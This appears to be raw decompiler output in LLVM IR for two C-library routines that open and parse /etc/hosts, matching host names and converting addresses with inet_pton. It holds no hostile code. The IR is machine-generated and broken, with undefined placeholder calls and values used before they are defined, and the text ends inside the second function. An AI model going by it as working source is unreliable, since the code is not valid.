define i32 @__open_etc_hosts() local_unnamed_addr {
entry:
  %stack_var_-4 = alloca i32, align 4
  store i32 ptrtoint (i32* @global_var_15618.717 to i32), i32* @r1, align 4
  %v0_12078 = load i32, i32* @lr, align 4
  store i32 %v0_12078, i32* %stack_var_-4, align 4
  store i32 ptrtoint ([11 x i8]* @global_var_1567c.753 to i32), i32* @r0, align 4
  %v3_12080 = call i32 @__GI_fopen(i32 ptrtoint ([11 x i8]* @global_var_1567c.753 to i32), i32 ptrtoint (i32* @global_var_15618.717 to i32))
  %v2_12084 = icmp eq i32 %v3_12080, 0
  store i32 ptrtoint (i32* @global_var_15618.717 to i32), i32* @r1, align 4
  br i1 %v2_12084, label %bb2, label %bb

bb:                                               ; preds = %entry
  ret i32 %v3_12080

bb2:                                              ; preds = %entry
  store i32 ptrtoint ([18 x i8]* @global_var_15688.755 to i32), i32* @r0, align 4
  %v2_12094 = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_12094, i32* @lr, align 4
  %v3_12098 = call i32 @__GI_fopen(i32 ptrtoint ([18 x i8]* @global_var_15688.755 to i32), i32 ptrtoint (i32* @global_var_15618.717 to i32))
  ret i32 %v3_12098

; uselistorder directives
  uselistorder i32 (i32, i32)* @__GI_fopen, { 7, 2, 1, 0, 6, 5, 4, 3 }
  uselistorder i32 114, { 2, 0, 1 }
  uselistorder i32 ptrtoint (i32* @global_var_15618.717 to i32), { 1, 4, 0, 5, 2, 6, 3, 7 }
}

define i32 @__read_etc_hosts_r() local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  %tmp53 = call i32 @__decompiler_undefined_function_0()
  %tmp56 = call i32 @__decompiler_undefined_function_0()
  %tmp57 = call i32 @__decompiler_undefined_function_0()
  %tmp61 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-64 = alloca i32, align 4
  %v3_120a8 = load i32, i32* @r4, align 4
  %v6_120a8 = load i32, i32* @r5, align 4
  %v12_120a8 = load i32, i32* @r7, align 4
  %v15_120a8 = load i32, i32* @r8, align 4
  %v21_120a8 = load i32, i32* @sl, align 4
  %v24_120a8 = load i32, i32* @fp, align 4
  store i32 %tmp61, i32* @r4, align 4
  %v1_120b4 = sub i32 0, %tmp61
  %v1_120b8 = urem i32 %v1_120b4, 4
  store i32 %v1_120b8, i32* %ip.global-to-local, align 4
  %v2_120b8 = icmp eq i32 %v1_120b8, 0
  %v0_120bc = load i32, i32* @r2, align 4
  %v0_120c0 = load i32, i32* @r0, align 4
  %v0_120c4 = load i32, i32* @r1, align 4
  %v0_120c8 = load i32, i32* @r3, align 4
  store i32 %v0_120c8, i32* %stack_var_-64, align 4
  store i32 %tmp57, i32* %r2.global-to-local, align 4
  br i1 %v2_120b8, label %dec_label_pc_120e8, label %dec_label_pc_120d8

dec_label_pc_120d8:                               ; preds = %entry
  %v2_120d8 = sub i32 %tmp57, %v1_120b8
  %v3_120d8 = icmp ult i32 %tmp57, %v1_120b8
  br i1 %v3_120d8, label %dec_label_pc_123bc, label %dec_label_pc_120e0

dec_label_pc_120e0:                               ; preds = %dec_label_pc_120d8
  store i32 %v2_120d8, i32* %r2.global-to-local, align 4
  %v2_120e4 = add i32 %v1_120b8, %tmp61
  store i32 %v2_120e4, i32* @r4, align 4
  br label %dec_label_pc_120e8

dec_label_pc_120e8:                               ; preds = %entry, %dec_label_pc_120e0
  %v0_120f8 = phi i32 [ %tmp61, %entry ], [ %v2_120e4, %dec_label_pc_120e0 ]
  %v0_120fc = phi i32 [ %tmp57, %entry ], [ %v2_120d8, %dec_label_pc_120e0 ]
  %tmp = icmp ult i32 %v0_120fc, 32
  br i1 %tmp, label %dec_label_pc_123bc, label %dec_label_pc_120f0

dec_label_pc_120f0:                               ; preds = %dec_label_pc_120e8
  store i32 %v0_120c8, i32* %r0.global-to-local, align 4
  %v7_120f4 = icmp eq i32 %v0_120c8, 1
  %v1_120f8 = add i32 %v0_120f8, 32
  store i32 %v1_120f8, i32* @fp, align 4
  %v1_120fc = add i32 %v0_120fc, -32
  store i32 %v1_120fc, i32* @r8, align 4
  br i1 %v7_120f4, label %dec_label_pc_12228, label %dec_label_pc_12104

dec_label_pc_12104:                               ; preds = %dec_label_pc_120f0
  store i32 %tmp56, i32* %r1.global-to-local, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v2_12110 = inttoptr i32 %tmp56 to i32*
  store i32 -1, i32* %v2_12110, align 4
  %tmp80 = icmp ult i32 %v1_120fc, 4
  br i1 %tmp80, label %dec_label_pc_123bc, label %dec_label_pc_12118

dec_label_pc_12118:                               ; preds = %dec_label_pc_12104
  %v0_12118 = load i32, i32* %r2.global-to-local, align 4
  %v1_12118 = add i32 %v0_12118, -36
  store i32 %v1_12118, i32* %r3.global-to-local, align 4
  %tmp81 = icmp ult i32 %v1_12118, 8
  br i1 %tmp81, label %dec_label_pc_123bc, label %dec_label_pc_12124

dec_label_pc_12124:                               ; preds = %dec_label_pc_12118
  %v0_12124 = load i32, i32* @r8, align 4
  %tmp82 = icmp ult i32 %v0_12124, 16
  br i1 %tmp82, label %dec_label_pc_123bc, label %dec_label_pc_1212c

dec_label_pc_1212c:                               ; preds = %dec_label_pc_12124
  %v1_1212c = add i32 %v0_12118, -48
  store i32 %v1_1212c, i32* %r3.global-to-local, align 4
  %tmp83 = icmp ult i32 %v1_1212c, 8
  br i1 %tmp83, label %dec_label_pc_123bc, label %dec_label_pc_12138

dec_label_pc_12138:                               ; preds = %dec_label_pc_1212c
  %v1_12138 = add i32 %v0_12118, -44
  store i32 %v1_12138, i32* @r8, align 4
  %v1_1213c = add i32 %v0_12118, -56
  store i32 %v1_1213c, i32* %r3.global-to-local, align 4
  %v3_12140 = icmp ult i32 %v1_1213c, %v1_12138
  br i1 %v3_12140, label %.thread1, label %bb

bb:                                               ; preds = %dec_label_pc_12138
  %v1_12148 = load i32, i32* @r4, align 4
  %v2_12148 = add i32 %v1_12148, 44
  br label %bb74

.thread1:                                         ; preds = %dec_label_pc_12138
  store i32 %v1_1213c, i32* @r8, align 4
  %v1_1214c.pre = load i32, i32* @r4, align 4
  %v2_1214c = add i32 %v1_1214c.pre, 56
  br label %bb74

bb74:                                             ; preds = %bb, %.thread1
  %storemerge = phi i32 [ %v2_1214c, %.thread1 ], [ %v2_12148, %bb ]
  %v0_12154 = phi i32 [ %v1_1214c.pre, %.thread1 ], [ %v1_12148, %bb ]
  %v0_12150 = phi i32 [ %v1_1213c, %.thread1 ], [ %v1_12138, %bb ]
  store i32 %storemerge, i32* @r5, align 4
  %v1_12154 = add i32 %v0_12154, 36
  store i32 %v1_12154, i32* @r6, align 4
  %v1_12158 = add i32 %v0_12154, 48
  store i32 %v1_12158, i32* %sl.global-to-local, align 4
  %tmp84 = icmp ult i32 %v0_12150, 80
  br i1 %tmp84, label %dec_label_pc_123bc, label %dec_label_pc_12160

dec_label_pc_12160:                               ; preds = %bb74
  %v0_12160 = call i32 @__open_etc_hosts()
  store i32 %v0_12160, i32* %r0.global-to-local, align 4
  %v2_12164 = icmp eq i32 %v0_12160, 0
  br i1 %v2_12164, label %dec_label_pc_12180, label %.thread

.thread:                                          ; preds = %dec_label_pc_12160
  %v1_1216c = load i32, i32* @fp, align 4
  store i32 %v1_1216c, i32* @r7, align 4
  %v1_12170 = load i32, i32* @r5, align 4
  store i32 %v1_12170, i32* @fp, align 4
  %v1_12174 = load i32, i32* @r6, align 4
  %v1_12178 = load i32, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_12234

dec_label_pc_12180:                               ; preds = %dec_label_pc_12160
  store i32 0, i32* %r3.global-to-local, align 4
  store i32 %tmp53, i32* %r2.global-to-local, align 4
  %v2_12188 = inttoptr i32 %tmp53 to i32*
  store i32 0, i32* %v2_12188, align 4
  %v0_1218c = call i32 @__errno_location()
  store i32 %v0_1218c, i32* %r0.global-to-local, align 4
  %v1_12190 = inttoptr i32 %v0_1218c to i32*
  %v2_12190 = load i32, i32* %v1_12190, align 4
  store i32 %v2_12190, i32* @sl, align 4
  br label %dec_label_pc_123c0

dec_label_pc_12198:                               ; preds = %dec_label_pc_12348
  %v0_12198 = load i32, i32* @r4, align 4
  %v1_12198 = add i32 %v0_12198, 4
  %v2_12198 = inttoptr i32 %v1_12198 to i32*
  %v3_12198 = load i32, i32* %v2_12198, align 4
  %v1_1219c = load i32, i32* @sb, align 4
  %v2_1219c = inttoptr i32 %v1_1219c to i32*
  store i32 %v3_12198, i32* %v2_1219c, align 4
  store i32 %stack_var_-48.1, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  store i32 %tmp53, i32* %ip.global-to-local, align 4
  %v0_121b0 = load i32, i32* @r4, align 4
  %v1_121b0 = add i32 %v0_121b0, 8
  store i32 %v1_121b0, i32* %r1.global-to-local, align 4
  %v1_121b4 = load i32, i32* @sb, align 4
  %v2_121b4 = add i32 %v1_121b4, 8
  %v3_121b4 = inttoptr i32 %v2_121b4 to i32*
  store i32 2, i32* %v3_121b4, align 4
  %v0_121b8 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_121b8, i32* @sl, align 4
  store i32 4, i32* %r3.global-to-local, align 4
  %v0_121c0 = load i32, i32* @sb, align 4
  %v1_121c0 = load i32, i32* %ip.global-to-local, align 4
  %v2_121c0 = inttoptr i32 %v1_121c0 to i32*
  store i32 %v0_121c0, i32* %v2_121c0, align 4
  %v0_121c4 = load i32, i32* @r7, align 4
  %v1_121c4 = load i32, i32* %r0.global-to-local, align 4
  %v2_121c4 = inttoptr i32 %v1_121c4 to i32*
  store i32 %v0_121c4, i32* %v2_121c4, align 4
  %v0_121c8 = load i32, i32* %r3.global-to-local, align 4
  %v1_121c8 = load i32, i32* @sb, align 4
  %v2_121c8 = add i32 %v1_121c8, 12
  %v3_121c8 = inttoptr i32 %v2_121c8 to i32*
  store i32 %v0_121c8, i32* %v3_121c8, align 4
  %v0_121cc = load i32, i32* %r0.global-to-local, align 4
  %v1_121cc = load i32, i32* @sb, align 4
  %v2_121cc = add i32 %v1_121cc, 16
  %v3_121cc = inttoptr i32 %v2_121cc to i32*
  store i32 %v0_121cc, i32* %v3_121cc, align 4
  %v0_121d0 = load i32, i32* %r1.global-to-local, align 4
  %v1_121d0 = load i32, i32* @sb, align 4
  %v2_121d0 = add i32 %v1_121d0, 4
  %v3_121d0 = inttoptr i32 %v2_121d0 to i32*
  store i32 %v0_121d0, i32* %v3_121d0, align 4
  %v0_121d4 = load i32, i32* %r2.global-to-local, align 4
  %v1_121d4 = load i32, i32* %r0.global-to-local, align 4
  %v2_121d4 = add i32 %v1_121d4, 4
  %v3_121d4 = inttoptr i32 %v2_121d4 to i32*
  store i32 %v0_121d4, i32* %v3_121d4, align 4
  br label %dec_label_pc_123a4

dec_label_pc_121dc:                               ; preds = %dec_label_pc_12370
  store i32 %tmp53, i32* %ip.global-to-local, align 4
  %v0_121e0 = load i32, i32* @r4, align 4
  %v1_121e0 = add i32 %v0_121e0, 4
  %v2_121e0 = inttoptr i32 %v1_121e0 to i32*
  %v3_121e0 = load i32, i32* %v2_121e0, align 4
  store i32 %v3_121e0, i32* %r3.global-to-local, align 4
  store i32 %stack_var_-40.1, i32* %r0.global-to-local, align 4
  %v0_121e8 = load i32, i32* @sb, align 4
  %v2_121e8 = inttoptr i32 %tmp53 to i32*
  store i32 %v0_121e8, i32* %v2_121e8, align 4
  store i32 %v0_12240, i32* %ip.global-to-local, align 4
  %v0_121f0 = load i32, i32* %r3.global-to-local, align 4
  %v1_121f0 = load i32, i32* @sb, align 4
  %v2_121f0 = inttoptr i32 %v1_121f0 to i32*
  store i32 %v0_121f0, i32* %v2_121f0, align 4
  store i32 16, i32* %r3.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v0_121fc = load i32, i32* %ip.global-to-local, align 4
  %v1_121fc = load i32, i32* %r0.global-to-local, align 4
  %v2_121fc = inttoptr i32 %v1_121fc to i32*
  store i32 %v0_121fc, i32* %v2_121fc, align 4
  %v0_12200 = load i32, i32* %r3.global-to-local, align 4
  %v1_12200 = load i32, i32* @sb, align 4
  %v2_12200 = add i32 %v1_12200, 12
  %v3_12200 = inttoptr i32 %v2_12200 to i32*
  store i32 %v0_12200, i32* %v3_12200, align 4
  store i32 10, i32* %r0.global-to-local, align 4
  store i32 %stack_var_-40.1, i32* %r3.global-to-local, align 4
  %v0_1220c = load i32, i32* @r4, align 4
  %v1_1220c = add i32 %v0_1220c, 8
  store i32 %v1_1220c, i32* %r1.global-to-local, align 4
  %v0_12210 = load i32, i32* %r2.global-to-local, align 4
  store i32 %v0_12210, i32* @sl, align 4
  %v1_12214 = load i32, i32* @sb, align 4
  %v2_12214 = add i32 %v1_12214, 8
  %v3_12214 = inttoptr i32 %v2_12214 to i32*
  store i32 10, i32* %v3_12214, align 4
  %v0_12218 = load i32, i32* %r3.global-to-local, align 4
  %v1_12218 = load i32, i32* @sb, align 4
  %v2_12218 = add i32 %v1_12218, 16
  %v3_12218 = inttoptr i32 %v2_12218 to i32*
  store i32 %v0_12218, i32* %v3_12218, align 4
  %v0_1221c = load i32, i32* %r1.global-to-local, align 4
  %v1_1221c = load i32, i32* @sb, align 4
  %v2_1221c = add i32 %v1_1221c, 4
  %v3_1221c = inttoptr i32 %v2_1221c to i32*
  store i32 %v0_1221c, i32* %v3_1221c, align 4
  %v0_12220 = load i32, i32* %r2.global-to-local, align 4
  %v1_12220 = load i32, i32* %r3.global-to-local, align 4
  %v2_12220 = add i32 %v1_12220, 4
  %v3_12220 = inttoptr i32 %v2_12220 to i32*
  store i32 %v0_12220, i32* %v3_12220, align 4
  br label %dec_label_pc_123a4

dec_label_pc_12228:                               ; preds = %dec_label_pc_120f0
  store i32 0, i32* @r7, align 4
  %.pre = inttoptr i32 %tmp56 to i32*
  br label %dec_label_pc_12234

dec_label_pc_12234:                               ; preds = %.thread, %dec_label_pc_12228
  %v2_12244.pre-phi = phi i32* [ %v2_12110, %.thread ], [ %.pre, %dec_label_pc_12228 ]
  %v0_12240 = phi i32 [ %v1_1216c, %.thread ], [ 0, %dec_label_pc_12228 ]
  %stack_var_-40.1 = phi i32 [ %v1_12178, %.thread ], [ 0, %dec_label_pc_12228 ]
  %stack_var_-48.1 = phi i32 [ %v1_12174, %.thread ], [ 0, %dec_label_pc_12228 ]
  %stack_var_-52.0 = phi i32 [ %v0_12160, %.thread ], [ %v0_120c0, %dec_label_pc_12228 ]
  store i32 1, i32* %r3.global-to-local, align 4
  store i32 %tmp56, i32* %ip.global-to-local, align 4
  store i32 1, i32* @sl, align 4
  store i32 1, i32* %v2_12244.pre-phi, align 4
  %v2_12308 = inttoptr i32 %v0_120c4 to i8*
  %v7_12340 = icmp eq i32 %v0_120bc, 2
  %v7_12368 = icmp eq i32 %v0_120bc, 10
  br label %dec_label_pc_1238c

dec_label_pc_1224c:                               ; preds = %dec_label_pc_1238c
  %v0_1224c = load i32, i32* @fp, align 4
  store i32 %v0_1224c, i32* %r0.global-to-local, align 4
  store i32 35, i32* %r1.global-to-local, align 4
  %v2_12254 = call i32 @__GI_strchr(i32 %v0_1224c, i32 35)
  store i32 %v2_12254, i32* %r0.global-to-local, align 4
  %v3_12258 = icmp eq i32 %v2_12254, 0
  br i1 %v3_12258, label %.thread10, label %bb75

.thread10:                                        ; preds = %dec_label_pc_1224c
  %v0_1226011 = load i32, i32* @fp, align 4
  store i32 %v0_1226011, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r6, align 4
  br label %dec_label_pc_122cc.preheader

bb75:                                             ; preds = %dec_label_pc_1224c
  %v3_12254 = inttoptr i32 %v2_12254 to i8*
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_12260 = load i32, i32* @fp, align 4
  store i32 %v0_12260, i32* %r2.global-to-local, align 4
  store i32 0, i32* @r6, align 4
  store i8 0, i8* %v3_12254, align 1
  %v0_122cc30.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_122cc.preheader

dec_label_pc_122cc.preheader:                     ; preds = %bb75, %.thread10
  %v0_122cc30 = phi i32 [ %v0_122cc30.pre, %bb75 ], [ %v0_1226011, %.thread10 ]
  %v1_122cc31 = inttoptr i32 %v0_122cc30 to i8*
  %v2_122cc32 = load i8, i8* %v1_122cc31, align 1
  %v3_122cc33 = zext i8 %v2_122cc32 to i32
  store i32 %v3_122cc33, i32* %r3.global-to-local, align 4
  %v2_122d034 = icmp eq i8 %v2_122cc32, 0
  br i1 %v2_122d034, label %dec_label_pc_122d8, label %dec_label_pc_12278.preheader

dec_label_pc_12270:                               ; preds = %dec_label_pc_12284
  store i32 0, i32* %r3.global-to-local, align 4
  %v3_12274 = inttoptr i32 %v8_1229c to i8*
  store i8 0, i8* %v3_12274, align 1
  %v4_12274 = load i32, i32* %r2.global-to-local, align 4
  %v5_12274 = add i32 %v4_12274, 1
  store i32 %v5_12274, i32* %r2.global-to-local, align 4
  %v1_12278 = inttoptr i32 %v5_12274 to i8*
  %v2_12278 = load i8, i8* %v1_12278, align 1
  %v3_12278 = zext i8 %v2_12278 to i32
  store i32 %v3_12278, i32* %r1.global-to-local, align 4
  %v2_1227c = icmp eq i8 %v2_12278, 0
  br i1 %v2_1227c, label %dec_label_pc_122d8, label %dec_label_pc_12284

dec_label_pc_12284:                               ; preds = %dec_label_pc_12278.preheader, %dec_label_pc_12270
  %v8_1229c = phi i32 [ %v5_12274, %dec_label_pc_12270 ], [ %v0_1227820, %dec_label_pc_12278.preheader ]
  %v1_1228c = phi i32 [ %v3_12278, %dec_label_pc_12270 ], [ %v3_1227823, %dec_label_pc_12278.preheader ]
  %v2_12288 = load i32, i32* @global_var_1e7a4, align 4
  store i32 %v2_12288, i32* %r3.global-to-local, align 4
  %v3_1228c = mul nuw nsw i32 %v1_1228c, 2
  %v4_1228c = add i32 %v3_1228c, %v2_12288
  %v5_1228c = inttoptr i32 %v4_1228c to i8*
  %v6_1228c = load i8, i8* %v5_1228c, align 1
  %v8_1228c = zext i8 %v6_1228c to i32
  store i32 %v8_1228c, i32* %r3.global-to-local, align 4
  %v1_12290 = and i32 %v8_1228c, 32
  %v2_12290 = icmp eq i32 %v1_12290, 0
  br i1 %v2_12290, label %dec_label_pc_12298, label %dec_label_pc_12270

dec_label_pc_12298:                               ; preds = %dec_label_pc_12284
  %v0_12298 = load i32, i32* @r6, align 4
  %v7_1229c = icmp slt i32 %v0_12298, 7
  br i1 %v7_1229c, label %bb76, label %dec_label_pc_122ac.preheader

bb76:                                             ; preds = %dec_label_pc_12298
  %v9_1229c = load i32, i32* @r4, align 4
  %v13_1229c = mul i32 %v0_12298, 4
  %v14_1229c = add i32 %v9_1229c, %v13_1229c
  %v15_1229c = inttoptr i32 %v14_1229c to i32*
  store i32 %v8_1229c, i32* %v15_1229c, align 4
  %v8_122a0 = load i32, i32* @r6, align 4
  %v9_122a0 = add i32 %v8_122a0, 1
  store i32 %v9_122a0, i32* @r6, align 4
  %v0_122ac25.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_122ac.preheader

dec_label_pc_122ac.preheader:                     ; preds = %bb76, %dec_label_pc_12298
  %v0_122ac25 = phi i32 [ %v0_122ac25.pre, %bb76 ], [ %v8_1229c, %dec_label_pc_12298 ]
  %v1_122ac26 = inttoptr i32 %v0_122ac25 to i8*
  %v2_122ac27 = load i8, i8* %v1_122ac26, align 1
  %v3_122ac28 = zext i8 %v2_122ac27 to i32
  store i32 %v3_122ac28, i32* %r1.global-to-local, align 4
  %v2_122b029 = icmp eq i8 %v2_122ac27, 0
  br i1 %v2_122b029, label %dec_label_pc_122cc.loopexit, label %dec_label_pc_122b8.lr.ph

dec_label_pc_122b8.lr.ph:                         ; preds = %dec_label_pc_122ac.preheader
  %v2_122bc.pre = load i32, i32* @global_var_1e7a4, align 4
  br label %dec_label_pc_122b8

dec_label_pc_122a8:                               ; preds = %dec_label_pc_122b8
  %v1_122a8 = add i32 %v0_122a8, 1
  store i32 %v1_122a8, i32* %r2.global-to-local, align 4
  %v1_122ac = inttoptr i32 %v1_122a8 to i8*
  %v2_122ac = load i8, i8* %v1_122ac, align 1
  %v3_122ac = zext i8 %v2_122ac to i32
  store i32 %v3_122ac, i32* %r1.global-to-local, align 4
  %v2_122b0 = icmp eq i8 %v2_122ac, 0
  br i1 %v2_122b0, label %dec_label_pc_122cc.loopexit, label %dec_label_pc_122b8

dec_label_pc_122b8:                               ; preds = %dec_label_pc_122b8.lr.ph, %dec_label_pc_122a8
  %v0_122a8 = phi i32 [ %v0_122ac25, %dec_label_pc_122b8.lr.ph ], [ %v1_122a8, %dec_label_pc_122a8 ]
  %v1_122c0 = phi i32 [ %v3_122ac28, %dec_label_pc_122b8.lr.ph ], [ %v3_122ac, %dec_label_pc_122a8 ]
  store i32 %v2_122bc.pre, i32* %r3.global-to-local, align 4
  %v3_122c0 = mul nuw nsw i32 %v1_122c0, 2
  %v4_122c0 = add i32 %v3_122c0, %v2_122bc.pre
  %v5_122c0 = inttoptr i32 %v4_122c0 to i8*
  %v6_122c0 = load i8, i8* %v5_122c0, align 1
  %v8_122c0 = zext i8 %v6_122c0 to i32
  store i32 %v8_122c0, i32* %r3.global-to-local, align 4
  %v1_122c4 = and i32 %v8_122c0, 32
  %v2_122c4 = icmp eq i32 %v1_122c4, 0
  br i1 %v2_122c4, label %dec_label_pc_122a8, label %dec_label_pc_122cc.loopexit

dec_label_pc_122cc.loopexit:                      ; preds = %dec_label_pc_122b8, %dec_label_pc_122a8, %dec_label_pc_122ac.preheader
  %v0_122cc = phi i32 [ %v0_122ac25, %dec_label_pc_122ac.preheader ], [ %v0_122a8, %dec_label_pc_122b8 ], [ %v1_122a8, %dec_label_pc_122a8 ]
  %v1_122cc = inttoptr i32 %v0_122cc to i8*
  %v2_122cc = load i8, i8* %v1_122cc, align 1
  %v3_122cc = zext i8 %v2_122cc to i32
  store i32 %v3_122cc, i32* %r3.global-to-local, align 4
  %v2_122d0 = icmp eq i8 %v2_122cc, 0
  br i1 %v2_122d0, label %dec_label_pc_122d8, label %dec_label_pc_12278.preheader

dec_label_pc_12278.preheader:                     ; preds = %dec_label_pc_122cc.preheader, %dec_label_pc_122cc.loopexit
  %v0_1227820 = phi i32 [ %v0_122cc, %dec_label_pc_122cc.loopexit ], [ %v0_122cc30, %dec_label_pc_122cc.preheader ]
  %v1_1227821 = inttoptr i32 %v0_1227820 to i8*
  %v2_1227822 = load i8, i8* %v1_1227821, align 1
  %v3_1227823 = zext i8 %v2_1227822 to i32
  store i32 %v3_1227823, i32* %r1.global-to-local, align 4
  %v2_1227c24 = icmp eq i8 %v2_1227822, 0
  br i1 %v2_1227c24, label %dec_label_pc_122d8, label %dec_label_pc_12284

dec_label_pc_122d8:                               ; preds = %dec_label_pc_122cc.loopexit, %dec_label_pc_12278.preheader, %dec_label_pc_12270, %dec_label_pc_122cc.preheader
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_122dc = load i32, i32* @r6, align 4
  %v1_122e0 = load i32, i32* @r4, align 4
  %v5_122e0 = mul i32 %v0_122dc, 4
  %v6_122e0 = add i32 %v1_122e0, %v5_122e0
  %v7_122e0 = inttoptr i32 %v6_122e0 to i32*
  store i32 0, i32* %v7_122e0, align 4
  %v7_122e4 = icmp sgt i32 %v0_122dc, 1
  br i1 %v7_122e4, label %dec_label_pc_122e8, label %dec_label_pc_1238c

dec_label_pc_122e8:                               ; preds = %dec_label_pc_122d8
  %v2_122e8 = load i32, i32* %stack_var_-64, align 4
  store i32 %v2_122e8, i32* %r0.global-to-local, align 4
  %v7_122ec = icmp eq i32 %v2_122e8, 1
  br i1 %v7_122ec, label %dec_label_pc_123c0, label %dec_label_pc_122f4

dec_label_pc_122f4:                               ; preds = %dec_label_pc_122e8
  %v7_122f4 = icmp eq i32 %v2_122e8, 2
  br i1 %v7_122f4, label %dec_label_pc_12300, label %dec_label_pc_1232c.preheader

dec_label_pc_1232c.preheader:                     ; preds = %dec_label_pc_122f4
  store i32 1, i32* @r5, align 4
  br label %dec_label_pc_1232c

dec_label_pc_12300:                               ; preds = %dec_label_pc_122f4
  store i32 %v0_120c4, i32* %r0.global-to-local, align 4
  %v0_12304 = load i32, i32* @r4, align 4
  %v1_12304 = inttoptr i32 %v0_12304 to i32*
  %v2_12304 = load i32, i32* %v1_12304, align 4
  store i32 %v2_12304, i32* @r1, align 4
  %v3_12308 = call i32 @__GI_strcoll(i8* %v2_12308, i32 %v2_12304)
  store i32 %v3_12308, i32* %r0.global-to-local, align 4
  %v2_1230c = icmp eq i32 %v3_12308, 0
  br i1 %v2_1230c, label %dec_label_pc_1233c, label %dec_label_pc_1238c

dec_label_pc_12318:                               ; preds = %dec_label_pc_1232c
  %v0_12318 = load i32, i32* @r4, align 4
  %v4_12318 = mul i32 %v1_12318, 4
  %v5_12318 = add i32 %v0_12318, %v4_12318
  %v6_12318 = inttoptr i32 %v5_12318 to i32*
  %v7_12318 = load i32, i32* %v6_12318, align 4
  store i32 %v7_12318, i32* %r1.global-to-local, align 4
  %v3_1231c = call i32 @__GI_strcasecmp(i8* %v2_12308, i32 %v7_12318)
  store i32 %v3_1231c, i32* %r0.global-to-local, align 4
  %v2_12320 = icmp eq i32 %v3_1231c, 0
  %v0_12324 = load i32, i32* @r5, align 4
  %v1_12324 = add i32 %v0_12324, 1
  store i32 %v1_12324, i32* @r5, align 4
  br i1 %v2_12320, label %dec_label_pc_1233c, label %dec_label_pc_1232c

dec_label_pc_1232c:                               ; preds = %dec_label_pc_1232c.preheader, %dec_label_pc_12318
  %v1_12318 = phi i32 [ 1, %dec_label_pc_1232c.preheader ], [ %v1_12324, %dec_label_pc_12318 ]
  %v1_1232c = load i32, i32* @r6, align 4
  store i32 %v0_120c4, i32* %r0.global-to-local, align 4
  %v5_12334 = icmp slt i32 %v1_12318, %v1_1232c
  br i1 %v5_12334, label %dec_label_pc_12318, label %dec_label_pc_1238c

dec_label_pc_1233c:                               ; preds = %dec_label_pc_12318, %dec_label_pc_12300
  store i32 %v0_120bc, i32* %r1.global-to-local, align 4
  br i1 %v7_12340, label %dec_label_pc_12348, label %dec_label_pc_12364

dec_label_pc_12348:                               ; preds = %dec_label_pc_1233c
  store i32 2, i32* %r0.global-to-local, align 4
  %v0_1234c = load i32, i32* @r7, align 4
  store i32 %v0_1234c, i32* %r2.global-to-local, align 4
  %v0_12350 = load i32, i32* @r4, align 4
  %v1_12350 = inttoptr i32 %v0_12350 to i32*
  %v2_12350 = load i32, i32* %v1_12350, align 4
  store i32 %v2_12350, i32* %r1.global-to-local, align 4
  %v3_12354 = inttoptr i32 %v2_12350 to i8*
  %v4_12354 = call i32 @inet_pton(i32 2, i8* %v3_12354, i32 %v0_1234c)
  store i32 %v4_12354, i32* %r0.global-to-local, align 4
  %v5_1235c = icmp sgt i32 %v4_12354, 0
  br i1 %v5_1235c, label %dec_label_pc_12198, label %dec_label_pc_12388

dec_label_pc_12364:                               ; preds = %dec_label_pc_1233c
  store i32 %v0_120bc, i32* %r2.global-to-local, align 4
  br i1 %v7_12368, label %dec_label_pc_12370, label %dec_label_pc_12388

dec_label_pc_12370:                               ; preds = %dec_label_pc_12364
  store i32 10, i32* %r0.global-to-local, align 4
  %v0_12374 = load i32, i32* @r4, align 4
  %v1_12374 = inttoptr i32 %v0_12374 to i32*
  %v2_12374 = load i32, i32* %v1_12374, align 4
  store i32 %v2_12374, i32* %r1.global-to-local, align 4
  store i32 %v0_12240, i32* %r2.global-to-local, align 4
  %v3_1237c = inttoptr i32 %v2_12374 to i8*
  %v4_1237c = call i32 @inet_pton(i32 10, i8* %v3_1237c, i32 %v0_12240)
  store i32 %v4_1237c, i32* %r0.global-to-local, align 4
  %v5_12384 = icmp sgt i32 %v4_1237c, 0
  br i1 %v5_12384, label %dec_label_pc_121dc, label %dec_label_pc_12388

dec_label_pc_12388:                               ; preds = %dec_label_pc_12348, %dec_label_pc_12364, %dec_label_pc_12370
  store i32 2, i32* @sl, align 4
  br label %dec_label_pc_1238c

dec_label_pc_1238c:                               ; preds = %dec_label_pc_1232c, %dec_label_pc_12300, %dec_label_pc_122d8, %dec_label_pc_12388, %dec_label_pc_12234
  %v0_1238c = load i32, i32* @fp, align 4
  store i32 %v0_1238c, i32* %r0.global-to-local, align 4
  %v0_12390 = load i32, i32* @r8, align 4
  store i32 %v0_12390, i32* %r1.global-to-local, align 4
  store i32 %stack_var_-52.0, i32* %r2.global-to-local, align 4
  %v3_12398 = call i32 @fgets(i32 %v0_1238c, i32 %v0_12390, i32 %stack_var_-52.0)
  store i32 %v3_12398, i32* %r0.global-to-local, align 4
  %v2_1239c = icmp eq i32 %v3_12398, 0
  br i1 %v2_1239c, label %dec_label_pc_123a4, label %dec_label_pc_1224c

dec_label_pc_123a4:                               ; preds = %dec_label_pc_1238c, %dec_label_pc_121dc, %dec_label_pc_12198
  %v2_123a4 = load i32, i32* %stack_var_-64, align 4
  store i32 %v2_123a4, i32* %r3.global-to-local, align 4
  %v7_123a8 = icmp eq i32 %v2_123a4, 1
  br i1 %v7_123a8, label %dec_label_pc_123c0, label %dec_label_pc_123b0

dec_label_pc_123b0:                               ; preds = %dec_label_pc_123a4
  store i32 %stack_var_-52.0, i32* %r0.global-to-local, align 4
  %v1_123b4 = inttoptr i32 %stack_var_-52.0 to i8*
  %v2_123b4 = call i32 @__GI_fclose(i8* %v1_123b4)
  store i32 %v2_123b4, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_123c0

